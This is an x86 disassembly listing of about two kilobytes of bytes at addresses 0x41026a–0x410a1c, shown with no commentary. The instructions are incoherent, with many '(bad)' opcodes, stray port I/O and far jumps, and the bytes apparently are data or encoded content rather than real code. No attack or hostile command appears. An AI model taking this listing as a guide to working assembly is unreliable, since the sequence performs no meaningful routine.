  41026a:	(bad)  [edi-0x4f9c9b11]
  410270:	cwde   
  410271:	pop    edx
  410272:	cmp    eax,0xd8221cac
  410277:	nop
  410278:	idiv   esp
  41027a:	mov    cs,WORD PTR [ecx-0x68103538]
  410280:	in     al,dx
  410281:	imul   edi,DWORD PTR [edx+0x14ada68e],0xf9d287be
  41028b:	mov    dl,al
  41028d:	fisubr WORD PTR [esp+edx*1+0x6ae1701]
  410294:	pop    edx
  410295:	and    al,0xe2
  410297:	lods   eax,DWORD PTR ds:[esi]
  410298:	out    0xb7,al
  41029a:	aaa    
  41029b:	mov    eax,0x2886f10f
  4102a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a1:	adc    DWORD PTR [esi],eax
  4102a3:	mov    bh,0xb3
  4102a5:	out    0xf,eax
  4102a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102a8:	dec    BYTE PTR [eax+0x7c]
  4102ab:	push   0xa485fa0a
  4102b0:	jle    0x4102c2
  4102b2:	fsub   st,st(6)
  4102b4:	data16 (bad) 
  4102b6:	lods   eax,DWORD PTR ds:[esi]
  4102b7:	ins    BYTE PTR es:[edi],dx
  4102b8:	ret    0xe5f7
  4102bb:	add    eax,DWORD PTR [ecx]
  4102bd:	xor    BYTE PTR [esp+edi*4-0x68b2b29d],bh
  4102c4:	out    dx,al
  4102c5:	jne    0x410343
  4102c7:	inc    esi
  4102c8:	xchg   ebp,eax
  4102c9:	test   bl,ch
  4102cb:	enter  0xfa24,0xe
  4102cf:	clc    
  4102d0:	add    DWORD PTR [eax],eax
  4102d2:	cmp    ebx,DWORD PTR [ecx-0x66bb9751]
  4102d8:	pop    es
  4102d9:	jne    0x4102ba
  4102db:	or     DWORD PTR [ebx-0x30],esp
  4102de:	xchg   ebp,eax
  4102df:	clc    
  4102e0:	pop    edi
  4102e1:	cmp    edi,DWORD PTR ds:0x7f7ca647
  4102e7:	sub    al,0x2f
  4102e9:	fucomi st,st(6)
  4102eb:	sbb    edx,DWORD PTR [esi-0x5aec8d94]
  4102f1:	xor    ecx,ecx
  4102f3:	or     edx,DWORD PTR [ebx-0x52]
  4102f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102f7:	or     al,0x95
  4102f9:	je     0x41028b
  4102fb:	hlt    
  4102fc:	mov    eax,0x98b18ad9
  410301:	push   es
  410302:	jns    0x41034a
  410304:	xchg   edx,eax
  410305:	popa   
  410306:	outs   dx,BYTE PTR ds:[esi]
  410307:	shl    DWORD PTR [ecx],0x65
  41030a:	out    dx,eax
  41030b:	int3   
  41030c:	lds    eax,FWORD PTR [ebx-0x36cbbba4]
  410312:	jmp    0x4102ba
  410314:	adc    al,0xcc
  410316:	int    0xbf
  410318:	jl     0x410367
  41031a:	push   gs
  41031c:	mov    eax,ds:0x66683c59
  410321:	sub    edi,DWORD PTR [esi+0x1b6cb24d]
  410327:	xchg   ebx,eax
  410328:	stos   BYTE PTR es:[edi],al
  410329:	mov    bh,0x32
  41032b:	add    DWORD PTR [edx+0x7c60179e],esp
  410331:	mov    esp,0x5e5128ba
  410336:	mov    edx,0xa9ee7685
  41033b:	imul   edi,ebx,0x28
  41033e:	loope  0x4102da
  410340:	lods   eax,DWORD PTR ds:[esi]
  410341:	outs   dx,DWORD PTR ds:[esi]
  410342:	retf   0xa091
  410345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410346:	inc    ebp
  410347:	jg     0x410353
  410349:	and    BYTE PTR [edi-0x5c280f9d],0x6b
  410350:	inc    ecx
  410351:	mov    ds:0x76a998dd,eax
  410356:	(bad)  
  410357:	sbb    dl,BYTE PTR [ebx+0x183466e0]
  41035d:	pop    ds
  41035e:	mov    eax,ds:0x8c9c47f1
  410363:	xor    eax,0x1d
  410366:	test   al,0x8a
  410368:	in     al,dx
  410369:	push   ecx
  41036a:	mov    al,0x22
  41036c:	pop    es
  41036d:	inc    ecx
  41036e:	(bad)  
  41036f:	jl     0x4102f9
  410371:	jecxz  0x410344
  410373:	jge    0x4103da
  410375:	cli    
  410376:	retf   
  410377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410379:	data16 add bl,BYTE PTR [ebx]
  41037c:	xchg   ecx,eax
  41037d:	jno    0x41030f
  41037f:	sub    edx,DWORD PTR [ebp+0xd]
  410382:	test   al,0x4d
  410384:	lods   al,BYTE PTR ds:[esi]
  410385:	sub    DWORD PTR [esi+edi*4-0x1a7d37eb],esi
  41038c:	adc    eax,0x2641ffbc
  410391:	mov    eax,0x6d0a3f3
  410396:	jl     0x410383
  410398:	scas   eax,DWORD PTR es:[edi]
  410399:	sbb    DWORD PTR [ecx],0xffffffa3
  41039c:	adc    bh,bh
  41039e:	enter  0xcd2d,0x68
  4103a2:	pop    edi
  4103a3:	xor    DWORD PTR [eax],0x685d9405
  4103a9:	xor    al,0x68
  4103ab:	xchg   BYTE PTR [ecx],bl
  4103ad:	jecxz  0x410361
  4103af:	ins    BYTE PTR es:[edi],dx
  4103b0:	fild   WORD PTR [esi-0xa]
  4103b3:	outs   dx,BYTE PTR ds:[esi]
  4103b4:	add    DWORD PTR [edi-0x64],ebp
  4103b7:	sbb    DWORD PTR [edi+0x25],ecx
  4103ba:	adc    DWORD PTR [eax],0xdde0c356
  4103c0:	out    dx,eax
  4103c1:	js     0x410360
  4103c3:	or     ah,al
  4103c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103c6:	cld    
  4103c7:	shl    ch,0x1e
  4103ca:	ret    0x740
  4103cd:	(bad)  
  4103ce:	pop    edx
  4103cf:	(bad)  
  4103d0:	jmp    ebp
  4103d2:	adc    BYTE PTR [ecx+0x24],bh
  4103d5:	cmp    al,0xfb
  4103d7:	stos   DWORD PTR es:[edi],eax
  4103d8:	mov    bh,0x72
  4103da:	cmc    
  4103db:	sbb    ch,BYTE PTR ds:0x446ca9fe
  4103e1:	(bad)  
  4103e3:	jp     0x410385
  4103e5:	cwde   
  4103e6:	call   0x90407be
  4103eb:	sahf   
  4103ec:	pop    ebp
  4103ed:	mov    ebp,0x6dc33351
  4103f2:	pop    eax
  4103f3:	das    
  4103f4:	clc    
  4103f5:	fsubr  st,st(6)
  4103f7:	push   ds
  4103f8:	mov    esp,0x24d24776
  4103fd:	mov    esi,0x6d3d1e49
  410402:	repz dec ebx
  410404:	or     DWORD PTR [ebp+ebp*1-0x1a],0x12
  410409:	sub    BYTE PTR [esp+edi*8],ah
  41040c:	imul   ebx,DWORD PTR [edx-0xcfb6c47],0xfbed1069
  410416:	and    bl,BYTE PTR [edi-0x793e9019]
  41041c:	adc    esi,DWORD PTR [edi+0x57]
  41041f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410420:	mov    ds,WORD PTR [esp+edx*8]
  410423:	stos   DWORD PTR es:[edi],eax
  410424:	cmp    edi,edi
  410426:	or     al,0x0
  410428:	imul   ebx,DWORD PTR ss:[ecx-0x6b],0x409fd847
  410430:	mov    ebx,0xadd75cb3
  410435:	and    eax,0x8fc6f2c9
  41043a:	fstp   DWORD PTR [ecx]
  41043c:	lahf   
  41043d:	xchg   ecx,eax
  41043e:	aaa    
  41043f:	xchg   DWORD PTR [esi+0x25],esi
  410442:	mov    ebp,0x2589df3
  410447:	stos   BYTE PTR es:[edi],al
  410448:	fnstsw WORD PTR [esi+eax*8+0x64]
  41044c:	addr16 pop ebx
  41044e:	pop    ss
  41044f:	xor    eax,DWORD PTR [esi]
  410451:	adc    DWORD PTR ds:0xaa9b690,esi
  410457:	mov    ds:0x860813b2,al
  41045c:	sbb    ch,BYTE PTR [ebx+edi*4]
  41045f:	push   0xffffffc9
  410461:	in     eax,dx
  410462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410463:	imul   ecx,DWORD PTR [esi],0xc9e65e08
  410469:	shl    DWORD PTR [ebp-0x26acd31c],0x89
  410470:	lods   eax,DWORD PTR ds:[esi]
  410471:	cmp    ecx,DWORD PTR [esi-0x70]
  410474:	sbb    ebx,DWORD PTR [ebp-0x10259cfb]
  41047a:	mov    ch,0xe7
  41047c:	push   ebp
  41047d:	sub    ebp,DWORD PTR [ebx-0x6e]
  410480:	sti    
  410481:	push   cs
  410482:	arpl   WORD PTR [ecx-0x6e],di
  410485:	mov    al,0xd9
  410487:	sahf   
  410488:	(bad)  
  410489:	pop    ebp
  41048a:	loope  0x41047c
  41048c:	(bad)  
  41048d:	and    esp,ecx
  41048f:	fs ins DWORD PTR es:[edi],dx
  410491:	arpl   WORD PTR [eax-0x3a35e9d3],di
  410497:	jge    0x410439
  410499:	mov    al,0x35
  41049b:	ins    DWORD PTR es:[edi],dx
  41049c:	repz rcr ebx,cl
  41049f:	ficomp DWORD PTR [ecx+0x576303cd]
  4104a5:	sub    ebx,DWORD PTR [ecx+0x5]
  4104a8:	sbb    eax,0x16278b44
  4104ad:	imul   ebp,DWORD PTR [edi],0xad0e7112
  4104b3:	mov    WORD PTR [eax+0x5612c11b],es
  4104b9:	adc    dh,BYTE PTR [edx-0x4f87858e]
  4104bf:	cmp    ebx,DWORD PTR [esi-0xc]
  4104c2:	pop    ss
  4104c3:	sub    ebp,DWORD PTR [edi-0x10]
  4104c6:	cmp    edx,DWORD PTR [esi]
  4104c8:	clc    
  4104c9:	xor    dh,dh
  4104cb:	push   edi
  4104cc:	xchg   esp,eax
  4104cd:	lods   al,BYTE PTR ds:[esi]
  4104ce:	fdivr  st(3),st
  4104d0:	xchg   DWORD PTR [edx-0x37493a15],ebx
  4104d6:	sbb    edi,DWORD PTR [ebx+0x58]
  4104d9:	adc    al,0xf3
  4104db:	mov    WORD PTR [ebx],es
  4104dd:	fneni(8087 only) 
  4104df:	sti    
  4104e0:	dec    ecx
  4104e1:	xchg   ebx,eax
  4104e2:	xchg   DWORD PTR [edi],eax
  4104e4:	xor    bl,BYTE PTR [eax]
  4104e6:	inc    ebp
  4104e7:	imul   DWORD PTR [edi]
  4104e9:	lods   eax,DWORD PTR ds:[esi]
  4104ea:	mov    esp,DWORD PTR [edi]
  4104ec:	daa    
  4104ed:	out    0x7f,eax
  4104ef:	dec    ecx
  4104f0:	xchg   esi,eax
  4104f1:	cmp    dh,ch
  4104f3:	fs push 0xf37e5d50
  4104f9:	(bad)  
  4104fa:	and    ebx,DWORD PTR [ecx+0x29]
  4104fd:	jnp    0x4104fa
  4104ff:	(bad)  
  410500:	gs sub ecx,esp
  410503:	hlt    
  410504:	outs   dx,DWORD PTR ds:[esi]
  410505:	adc    al,0xd7
  410507:	loopne 0x41054b
  410509:	or     al,BYTE PTR [edi-0x7]
  41050c:	mov    bh,0x20
  41050e:	pop    ebx
  41050f:	cdq    
  410510:	(bad)  
  410511:	fwait
  410512:	sbb    ch,BYTE PTR [esi+0x9]
  410515:	test   BYTE PTR [edx],al
  410517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410518:	ss gs jmp 0x623f:0xa653f512
  410521:	loopne 0x4104bd
  410523:	repz rcr cl,cl
  410526:	xlat   BYTE PTR es:[ebx]
  410528:	retfw  
  41052a:	repz xchg esi,eax
  41052c:	int    0x4e
  41052e:	or     al,0xc7
  410530:	bound  edi,QWORD PTR [esi+0x77]
  410533:	fsub   DWORD PTR [ebx-0x56259a7b]
  410539:	add    eax,0x75c5f14e
  41053e:	fcmovne st,st(6)
  410540:	int    0x4a
  410542:	dec    eax
  410543:	inc    BYTE PTR [ebp-0x47630b58]
  410549:	mov    ds:0x5bcb4e55,eax
  41054e:	inc    eax
  41054f:	ins    BYTE PTR es:[edi],dx
  410550:	leave  
  410551:	pusha  
  410552:	shl    DWORD PTR [ebp-0x2b1bed11],1
  410558:	jae    0x4105cc
  41055a:	add    BYTE PTR ss:[edi+0x5a70be4b],cl
  410561:	mov    ah,0x2b
  410563:	out    dx,al
  410564:	shr    BYTE PTR [ecx+0x22fd79bb],cl
  41056a:	adc    dh,BYTE PTR [edx]
  41056c:	mov    ch,0xd5
  41056f:	mov    dh,0x66
  410571:	sub    bh,BYTE PTR [ecx+0x28]
  410574:	mov    al,0x7b
  410576:	psubq  mm1,QWORD PTR [esp+eax*4-0x4cbbd221]
  41057e:	lock pop eax
  410580:	mov    ecx,0xb694c4b3
  410585:	pop    ss
  410586:	push   ecx
  410587:	sub    BYTE PTR [edx],bh
  410589:	mov    ecx,DWORD PTR [edi]
  41058b:	push   cs
  41058c:	retf   0x99df
  41058f:	hlt    
  410590:	stos   DWORD PTR es:[edi],eax
  410591:	cli    
  410592:	sbb    al,0x93
  410594:	xlat   BYTE PTR ds:[ebx]
  410595:	xor    DWORD PTR [eax+ebx*8-0x542bb0c2],ecx
  41059c:	arpl   WORD PTR [ebx-0x34ba6e43],sp
  4105a2:	stc    
  4105a3:	imul   DWORD PTR [edx-0x6ba1f615]
  4105a9:	je     0x410579
  4105ab:	fist   WORD PTR [ecx-0x451b5b62]
  4105b1:	hlt    
  4105b2:	sbb    dh,ch
  4105b4:	sbb    esp,esi
  4105b6:	jecxz  0x41058f
  4105b8:	sbb    eax,0x5168e1ab
  4105bd:	ret    
  4105be:	mov    WORD PTR [ebx+0x69],cs
  4105c1:	mov    dl,0x51
  4105c3:	cdq    
  4105c4:	outs   dx,BYTE PTR ds:[esi]
  4105c5:	lods   al,BYTE PTR ds:[esi]
  4105c6:	fistp  DWORD PTR [edx]
  4105c8:	sbb    dl,bh
  4105ca:	pop    ds
  4105cb:	push   0xffffff89
  4105cd:	addr16 in eax,0xb5
  4105d0:	xchg   ebx,eax
  4105d1:	sbb    WORD PTR [ecx+0x6c],0x71
  4105d6:	jae    0x410567
  4105d8:	retf   0xf160
  4105db:	sub    DWORD PTR [edx],edx
  4105dd:	pushf  
  4105de:	xchg   esp,eax
  4105df:	mov    ebx,edi
  4105e1:	sbb    BYTE PTR [edi-0x35],ch
  4105e4:	icebp  
  4105e5:	(bad)
  4105e9:	fwait
  4105ea:	xor    esi,DWORD PTR [ebx+0x58dca146]
  4105f0:	cwde   
  4105f1:	ds ror cl,0x6b
  4105f5:	ja     0x4105c7
  4105f7:	pop    es
  4105f8:	push   0xdae0e133
  4105fd:	mov    cl,0x56
  4105ff:	pop    ebp
  410600:	mov    eax,ds:0xbbf0cffd
  410605:	test   al,0xc6
  410607:	sbb    ebp,DWORD PTR [ebx+edi*8+0x2e]
  41060b:	xchg   ebx,eax
  41060c:	lock lods eax,DWORD PTR ds:[esi]
  41060e:	pop    edi
  41060f:	out    dx,eax
  410610:	dec    edx
  410611:	lahf   
  410612:	pop    ebx
  410613:	into   
  410614:	push   cs
  410615:	(bad)  
  410616:	idiv   esp
  410618:	bound  esi,QWORD PTR [ecx+0x5d]
  41061b:	ja     0x4105c4
  41061d:	mov    ?,WORD PTR [esi-0x6f]
  410620:	fisttp QWORD PTR [eax]
  410622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410623:	adc    eax,0x4eaff05d
  410628:	fadd   QWORD PTR [edx+esi*2+0xf]
  41062c:	xchg   edi,eax
  41062d:	cld    
  41062e:	in     al,0x47
  410630:	cmc    
  410631:	cwde   
  410632:	jmp    0x6104:0xa15dee20
  410639:	(bad)  
  41063b:	pop    eax
  41063c:	push   ebp
  41063d:	nop
  41063e:	sub    BYTE PTR [esi-0x23],0x1b
  410642:	inc    ecx
  410643:	or     ebp,DWORD PTR [esp+eax*8-0x6a]
  410647:	rcl    DWORD PTR [edx+0x7],0xbf
  41064b:	mov    edi,esi
  41064d:	fst    DWORD PTR [esi]
  41064f:	pop    edx
  410650:	lock xor eax,0xe57a409d
  410656:	push   cs
  410657:	pushf  
  410658:	mov    eax,DWORD PTR [eax]
  41065a:	das    
  41065b:	ficomp DWORD PTR [ebx-0x18]
  41065e:	sbb    bl,bh
  410660:	leave  
  410661:	outs   dx,BYTE PTR ds:[esi]
  410662:	sbb    al,0x3c
  410664:	adc    ch,BYTE PTR [edi]
  410666:	mov    ebx,0xeaeadb01
  41066b:	gs adc esp,esp
  41066e:	sbb    cl,BYTE PTR [ecx]
  410670:	inc    ebp
  410671:	xor    eax,0x91926267
  410676:	iret   
  410677:	xchg   ebx,eax
  410678:	sub    DWORD PTR [edi],ecx
  41067a:	pop    ss
  41067b:	cli    
  41067c:	jo     0x410667
  41067e:	or     BYTE PTR [esi+esi*8],dh
  410681:	inc    ebp
  410682:	xor    ecx,edx
  410684:	das    
  410685:	adc    ch,0x34
  410688:	and    esi,DWORD PTR [eax-0x3a70b1e4]
  41068e:	repnz add ah,ch
  410691:	pop    esi
  410692:	(bad)  
  410694:	and    dh,BYTE PTR [edi-0x6d]
  410697:	push   ss
  410698:	fst    DWORD PTR [edx]
  41069a:	repnz sub eax,DWORD PTR [edi]
  41069d:	aad    0x6c
  41069f:	jl     0x41070e
  4106a1:	pop    ds
  4106a2:	mov    bl,0xb3
  4106a4:	ret    
  4106a5:	jne    0x4106ae
  4106a7:	mov    ds:0x3b6b9223,al
  4106ac:	arpl   dx,bp
  4106ae:	mov    eax,0x91fafd93
  4106b3:	hlt    
  4106b4:	mov    esi,0x621ecae
  4106b9:	adc    DWORD PTR [edi-0x3e],eax
  4106bc:	aad    0xe9
  4106be:	gs and ch,dl
  4106c1:	xor    eax,0xdf568f0
  4106c6:	xchg   DWORD PTR [eax+0x29],eax
  4106c9:	ss imul ebx,ebx,0xffffffe6
  4106cd:	loop   0x410651
  4106cf:	sbb    BYTE PTR [esi-0x18cf2473],bh
  4106d5:	(bad)  
  4106d6:	retf   
  4106d7:	lds    ebx,FWORD PTR [ebp-0x70f863e9]
  4106dd:	jl     0x41074a
  4106df:	adc    al,0x11
  4106e1:	addr16 mov bl,0x49
  4106e4:	rcr    DWORD PTR [ebx],cl
  4106e6:	jb     0x41075a
  4106e8:	shl    BYTE PTR [ebx-0x35],cl
  4106eb:	mov    ch,0xd1
  4106ed:	retf   
  4106ee:	cmp    DWORD PTR [edi-0x2d16855],esp
  4106f4:	jmp    0xaa9a:0x9807b555
  4106fb:	mov    ebx,0x1d2d6290
  410700:	push   cs
  410701:	fstp   QWORD PTR [edx+0x6dec75d5]
  410707:	out    0x62,al
  410709:	nop
  41070a:	outs   dx,BYTE PTR ds:[esi]
  41070b:	daa    
  41070c:	or     eax,0x682c758e
  410711:	repz jb 0x41070b
  410714:	es gs (bad) 
  410717:	rol    ebp,cl
  410719:	xor    edi,DWORD PTR [ecx+0x5]
  41071c:	jmp    0x41076d
  41071e:	aad    0xa3
  410720:	sbb    eax,0xcaf9d1d3
  410725:	(bad)  
  410727:	mov    al,ds:0x66a47993
  41072c:	pop    ecx
  41072d:	mov    edx,0xbdfe690b
  410732:	std    
  410733:	jb     0x4106b5
  410735:	add    BYTE PTR [edx+eiz*8+0x7ee48aef],dl
  41073c:	xchg   esi,eax
  41073d:	cmp    dl,BYTE PTR [edx]
  41073f:	sub    eax,0x1bb212a5
  410744:	mov    DWORD PTR [edx+ecx*8],ebx
  410747:	lock sbb al,bl
  41074a:	jae    0x4106e8
  41074c:	rcr    BYTE PTR [eax],1
  41074e:	in     eax,0x1
  410750:	jmp    0x2fd7:0xcd89d4d0
  410757:	cld    
  410758:	mov    esi,0xd6821c2d
  41075d:	mov    al,0xd4
  41075f:	rol    DWORD PTR [edx],0xd7
  410762:	cmc    
  410763:	scas   al,BYTE PTR es:[edi]
  410764:	cmp    al,BYTE PTR [esp+eiz*8+0x6984999a]
  41076b:	sub    BYTE PTR [esi+0x32d1282e],cl
  410771:	push   eax
  410772:	mul    DWORD PTR [ebp+0x1]
  410775:	xchg   BYTE PTR [ecx+0x367aa4b8],ch
  41077b:	lahf   
  41077c:	mov    bl,0xff
  41077e:	stos   BYTE PTR es:[edi],al
  41077f:	jmp    DWORD PTR [edi-0x6c5f564d]
  410785:	push   cs
  410786:	dec    ecx
  410787:	ds xchg edx,eax
  410789:	dec    esp
  41078a:	inc    bp
  41078c:	in     eax,dx
  41078d:	and    al,0x6
  41078f:	fisubr DWORD PTR [edi]
  410791:	sub    esp,edx
  410793:	into   
  410794:	adc    DWORD PTR [ebx],eax
  410796:	test   edi,ebx
  410798:	clc    
  410799:	arpl   sp,cx
  41079b:	pop    esi
  41079c:	push   cs
  41079d:	jne    0x4107a7
  41079f:	out    dx,eax
  4107a0:	sbb    al,0x5e
  4107a2:	jmp    0xf946a567
  4107a7:	adc    eax,0xd9d05654
  4107ac:	pop    esi
  4107ad:	jmp    0x4f96:0xb6a64038
  4107b4:	int    0x81
  4107b6:	daa    
  4107b7:	jl     0x410749
  4107b9:	xchg   edi,eax
  4107ba:	mov    al,ds:0x140cd9af
  4107bf:	pop    ecx
  4107c0:	clc    
  4107c1:	out    dx,eax
  4107c2:	dec    ebp
  4107c3:	add    BYTE PTR ds:0x22c4cdd9,0x5f
  4107ca:	lea    ecx,[edx-0x64aa29d]
  4107d0:	sbb    al,0xcd
  4107d2:	iret   
  4107d3:	cdq    
  4107d4:	pop    ecx
  4107d5:	retf   0xd128
  4107d8:	inc    edi
  4107d9:	jnp    0x4107ef
  4107db:	pop    eax
  4107dc:	xor    al,BYTE PTR [esi-0x4d]
  4107df:	aaa    
  4107e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107e1:	call   0x3a99:0x98641031
  4107e8:	daa    
  4107e9:	mov    eax,ds:0x2f6e0d27
  4107ee:	push   es
  4107ef:	sub    al,0xbf
  4107f1:	leave  
  4107f2:	js     0x41081c
  4107f4:	out    0x70,eax
  4107f6:	push   esi
  4107f7:	sub    eax,0xba7808a1
  4107fc:	fbld   TBYTE PTR [eax+esi*2-0x3f60ee32]
  410803:	in     eax,dx
  410804:	std    
  410805:	fs jne 0x410813
  410808:	sar    ah,1
  41080a:	sub    al,0xc1
  41080c:	sub    DWORD PTR [eax-0x37f795aa],esi
  410812:	cmp    al,0x54
  410814:	adc    BYTE PTR [ecx],al
  410816:	int3   
  410817:	pop    ss
  410818:	sahf   
  410819:	sbb    DWORD PTR [ebx],ecx
  41081b:	out    0xcf,eax
  41081d:	popa   
  41081e:	dec    esp
  41081f:	fmul   QWORD PTR [ebx]
  410821:	in     al,dx
  410822:	inc    ecx
  410823:	sbb    DWORD PTR [ebx+0x1a],0xecbbe2df
  41082a:	es jb  0x4108a5
  41082d:	xchg   ebx,eax
  41082e:	add    DWORD PTR [ebx],0x73a7209
  410834:	daa    
  410835:	pop    ebx
  410836:	shr    DWORD PTR [edi],0xbf
  410839:	ins    BYTE PTR es:[edi],dx
  41083a:	outs   dx,DWORD PTR ds:[esi]
  41083b:	shl    BYTE PTR [edx],0xbc
  41083e:	stos   BYTE PTR es:[edi],al
  41083f:	jno    0x41086d
  410841:	adc    BYTE PTR [edx+0x52],cl
  410844:	jno    0x410828
  410846:	push   es
  410847:	ret    0x4f96
  41084a:	pop    ss
  41084b:	pop    ss
  41084c:	je     0x4107ea
  41084e:	call   ebx
  410850:	setnp  BYTE PTR [eax-0x3534fd54]
  410857:	pop    ebp
  410858:	addr16 pusha 
  41085a:	and    dh,0x94
  41085d:	push   ss
  41085e:	mov    cl,bl
  410860:	push   0x9f5a50d6
  410865:	call   DWORD PTR [ecx-0x21]
  410868:	clc    
  410869:	outs   dx,BYTE PTR ds:[esi]
  41086a:	or     bl,BYTE PTR [eax-0x79]
  41086d:	push   edi
  41086e:	ins    DWORD PTR es:[edi],dx
  41086f:	(bad)  
  410870:	sub    al,0xf8
  410872:	(bad)  
  410873:	ret    0x4be3
  410876:	mov    cl,0xb
  410878:	mov    bl,0x6e
  41087a:	add    DWORD PTR [ecx-0x66d5987a],0x20cf6f47
  410884:	pop    eax
  410885:	jmp    0x30d6c35e
  41088a:	lods   al,BYTE PTR ds:[esi]
  41088b:	mov    al,BYTE PTR [ecx]
  41088d:	test   eax,0x61b8b95d
  410892:	push   ebp
  410893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410894:	push   edx
  410895:	mov    cl,0x2d
  410897:	add    al,bl
  410899:	std    
  41089a:	inc    esi
  41089b:	pusha  
  41089c:	(bad)  
  41089d:	repnz mov BYTE PTR [ecx-0x7e0a0394],ch
  4108a4:	les    esp,FWORD PTR [eax-0x48cc13cf]
  4108aa:	out    dx,al
  4108ab:	(bad)  
  4108ac:	mov    eax,0x2d34a67a
  4108b1:	add    ecx,DWORD PTR [esi+0x50]
  4108b4:	jns    0x4108fc
  4108b6:	test   eax,0xfbce265e
  4108bb:	out    0x5d,al
  4108bd:	arpl   bx,sp
  4108bf:	mov    eax,0xa4740392
  4108c4:	cmp    ah,BYTE PTR [ebp-0x5f]
  4108c7:	add    ebp,DWORD PTR [ecx+0x10]
  4108ca:	jno    0x4108a6
  4108cc:	jmp    0x25c1:0x18758cd3
  4108d3:	xchg   esi,eax
  4108d4:	sub    al,ah
  4108d6:	call   0xfe92:0xd1037869
  4108dd:	adc    al,0x29
  4108df:	mov    ebp,0x158adc2f
  4108e4:	(bad)  
  4108e5:	fsubr  DWORD PTR [ebx]
  4108e7:	(bad)  
  4108e8:	or     al,BYTE PTR [ecx-0x4e]
  4108eb:	test   al,dl
  4108ed:	dec    eax
  4108ee:	or     eax,DWORD PTR [edx]
  4108f0:	das    
  4108f1:	out    0x2e,al
  4108f3:	and    dl,BYTE PTR [esi-0x3acd6ce9]
  4108f9:	mov    ds:0x5ab08a6,eax
  4108fe:	mov    ds:0x26ec843d,eax
  410903:	xor    BYTE PTR [ebp-0x6],dl
  410906:	mov    bl,0x33
  410908:	xchg   esi,eax
  410909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41090a:	jmp    0x4108cc
  41090c:	mov    cl,0xf6
  41090e:	push   esi
  41090f:	jp     0x410935
  410911:	mov    BYTE PTR [ecx-0x789b4137],dl
  410917:	sar    BYTE PTR [edx],cl
  410919:	mov    BYTE PTR [esi+0x154cb91c],al
  41091f:	mov    esi,0x56e13a53
  410924:	jg     0x4108c3
  410926:	xor    DWORD PTR [edi+eax*4],esp
  410929:	(bad)  
  41092a:	adc    eax,0xf08999a8
  41092f:	or     esi,esi
  410931:	jecxz  0x4108ea
  410933:	adc    bh,al
  410935:	jae    0x410977
  410937:	jns    0x4108e3
  410939:	jle    0x4108dc
  41093b:	ja     0x41092a
  41093d:	add    cl,BYTE PTR [ecx+0x22ec4cfe]
  410943:	in     eax,dx
  410944:	mov    ah,0xcb
  410946:	cmp    eax,edi
  410948:	dec    ebx
  410949:	pop    eax
  41094a:	outs   dx,DWORD PTR ds:[esi]
  41094b:	adc    DWORD PTR [esi],esi
  41094d:	jge    0x41097c
  41094f:	out    dx,eax
  410950:	xor    ebx,DWORD PTR [bp+di+0x53bb]
  410955:	mov    ebx,0xa182fdfb
  41095a:	jne    0x41090e
  41095c:	out    dx,al
  41095d:	sub    dl,0x32
  410960:	sbb    al,0x2c
  410962:	out    0x9f,eax
  410964:	out    0x9e,al
  410966:	inc    esi
  410967:	jnp    0x4109b2
  410969:	or     edx,edi
  41096b:	mov    dl,0x80
  41096d:	mov    ecx,0x393b81a6
  410972:	inc    ecx
  410973:	xchg   ebx,eax
  410974:	call   0xce04:0x4f7add29
  41097b:	push   0x6b
  41097d:	xchg   edi,eax
  41097e:	sub    dh,cl
  410980:	test   DWORD PTR [ebx],0x2cae7bae
  410986:	aas    
  410987:	xor    al,0x14
  410989:	dec    ebx
  41098a:	rcl    DWORD PTR [esi],0xb7
  41098d:	repnz enter 0x49d1,0x8a
  410992:	or     al,0x6
  410994:	fisttp QWORD PTR ds:0x113bfcda
  41099a:	adc    esp,ebp
  41099c:	outs   dx,DWORD PTR ds:[esi]
  41099d:	idiv   ah
  41099f:	and    al,0x30
  4109a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109a2:	mov    edx,DWORD PTR [edi+0x382fbabe]
  4109a8:	cmp    al,0x8a
  4109aa:	pop    esi
  4109ab:	jle    0x410a0b
  4109ad:	(bad)  
  4109ae:	jg     0x41094c
  4109b0:	aad    0x8c
  4109b2:	(bad)  
  4109b3:	fidivr DWORD PTR [ebx+0x31]
  4109b6:	bound  ebx,QWORD PTR [ecx-0x63]
  4109b9:	push   ds
  4109ba:	mov    ebx,tr0
  4109bd:	cld    
  4109be:	mov    al,0x4c
  4109c0:	cli    
  4109c1:	ins    DWORD PTR es:[edi],dx
  4109c2:	cmp    eax,0x48e18ef6
  4109c7:	ret    0x6595
  4109ca:	cmp    bh,BYTE PTR [eax+0x77]
  4109cd:	leave  
  4109ce:	mov    eax,ds:0xa2a62e92
  4109d3:	scas   eax,DWORD PTR es:[edi]
  4109d4:	mov    edi,DWORD PTR [ebx]
  4109d6:	mov    DWORD PTR [edx],edi
  4109d8:	jo     0x41097b
  4109da:	test   eax,0xd1eaf369
  4109df:	stc    
  4109e0:	push   edx
  4109e1:	repnz dec ebp
  4109e3:	cs pop ss
  4109e5:	sar    BYTE PTR [eax+0x55],0x49
  4109e9:	test   DWORD PTR [edi+0x334cbbf9],0xba227a1b
  4109f3:	mov    DWORD PTR ds:[edx-0x4d],edi
  4109f7:	sub    al,0xf2
  4109f9:	xchg   ebx,eax
  4109fa:	add    DWORD PTR [edi+0x1a5c6d40],ebx
  410a00:	scas   al,BYTE PTR es:[di]
  410a02:	ret    
  410a03:	xchg   ecx,eax
  410a04:	or     ecx,ebx
  410a06:	dec    ebx
  410a07:	inc    ebp
  410a08:	mov    cl,0xdb
  410a0a:	pop    es
  410a0b:	loopne 0x4109e0
  410a0d:	push   ds
  410a0e:	dec    esp
  410a0f:	dec    edx
  410a10:	push   0xe39ce46d
  410a15:	icebp  
  410a16:	xor    al,0x52
  410a18:	sub    al,0x60
  410a1a:	ss pop edi
  410a1c:	std    
